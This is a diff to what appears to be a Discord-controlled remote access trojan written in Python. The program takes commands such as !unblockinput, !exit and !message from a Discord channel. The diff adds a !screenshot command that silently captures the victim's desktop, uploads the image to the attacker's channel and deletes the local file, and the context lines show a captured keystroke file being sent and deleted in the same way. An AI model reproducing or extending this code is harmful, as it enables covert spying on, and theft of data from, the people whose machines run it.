@@ -78,6 +78,8 @@ Availaible commands are :
 
 --> !unblockinput = Unblocks user's keyboard and mouse
 
+--> !screenshot = Get the screenshot of the user's current desktop screen
+
 --> !exit = Exit program
 
 """
@@ -146,16 +148,21 @@ async def on_message(message):
             await message.channel.send("[*] Command successfuly executed", file=file)
             os.popen("del " + file_keys)
 
-        elif message.content == "!exit":
+        if message.content == "!exit":
             import sys
             sys.exit()
 
-        elif message.content == "!screenshot":
+        if message.content == "!screenshot":
+            import os
             from mss import mss
             with mss() as sct:
-                sct.shot()
-            file = discord.File("monitor-1.png", filename="monitor-1.png")
+                sct.shot(output=os.path.join(
+                    os.getenv('TEMP') + "\\monitor.png"))
+            file = discord.File(os.path.join(
+                os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
             await message.channel.send("[*] Command successfuly executed", file=file)
+            os.remove(os.path.join(
+                os.getenv('TEMP') + "\\monitor.png"))
 
         if message.content.startswith("!message"):
             import ctypes
